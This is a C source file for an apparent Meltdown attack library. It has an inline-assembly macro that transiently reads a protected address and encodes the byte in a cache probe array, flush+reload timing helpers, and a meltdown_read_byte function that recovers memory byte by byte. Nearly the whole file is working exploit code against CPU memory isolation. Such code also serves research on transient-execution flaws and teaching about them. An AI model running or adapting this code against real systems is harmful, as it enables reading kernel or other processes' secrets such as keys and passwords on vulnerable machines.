/*
  Meltdown lib 
 */
#include "libmeltdown.h"

/*
  Downside of this implementation, can't read 0 values
  shift by 14 left since you want to mulitply the index by 4096 and sizeof(int) 
 
  NOTE: Must be an array of INTEGERS!!! NOT CHARS LIKE IN THE ORIGINAL PAPER
*/
#define MELTDOWN(addr) \
  asm("1:\n movzx (%%rcx), %%rax\n" \
      "shl $14, %%rax\n" \
      "jz 1b\n" \
      "movq (%%rax, %%rbx, 1), %%rbx\n" \ 
      :						\
      : "c"(addr), "b"(rec)			\
      : "rax");


/*
  Global vars 
 */
int* rec;


/*
  Helper functions 
*/
static inline void maccess(void *p) {
  asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax");
}

static void flush(void *p) {
  asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax");
}

static inline uint64_t rdtscp() {
  uint64_t a = 0, d = 0;
  asm volatile("mfence");
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;

}

static inline int flush_reload(void *p) {
  // time access
  register uint64_t start, elapsed; 
  start = rdtscp();
  maccess(p);
  elapsed = rdtscp() - start;
  flush(p);
  return elapsed < THRESHOLD ? 1 : 0;
}


/*
  Meltdown setup code 
 */
void meltdown_init() {
  // setup recieving array
  rec = (int *) malloc(300 * 4096 * sizeof(*rec)); // page stride
  rec = (int *) (((size_t)rec & ~0xfff) + 0x2000);
  memset(rec, 0x00, 4096 * 270 * sizeof(*rec)); // THIS IS NECESSARY OR ELSE FLUSHES TO ONE ADDRESS FLUSH THE WHOLE STRUCTURE
  for(int i = 0; i < 256; i++) {
    flush(&rec[i * 4096]); //flush it from memory 
  }
  INFO("Init finished\n");
}


/*
  Read byte function 
 */
char __attribute__((optimize("-Os"), noinline)) meltdown_read_byte(char* addr) {
  // hit counter
  int hit[256];
  memset(hit, 0, sizeof(hit));
  
  // repeat attack for RETRIES amount of time
  for(int j = 0; j < RETRIES; j++) {
    // meltdown attack into cache 
    MELTDOWN(addr);
    
    // flush + reload
    for(int k = 0; k < 256; k++) {
      if(flush_reload(rec + k*4096)) hit[k]++;
    }
  }
  
  // find max
  int max = 0;
  int max_idx = -1;
  for(int j = 0; j < 256; j++) {
    if(hit[j] > max) {
      max = hit[j];
      max_idx = j;
    }
  }
  
  // add ret
  char byte_value = (char)max_idx;
  
#if DEBUG
  INFO("byte value read: %d\n", byte_value);
#endif

  return byte_value;
}


/*
  TODO read string function 
*/
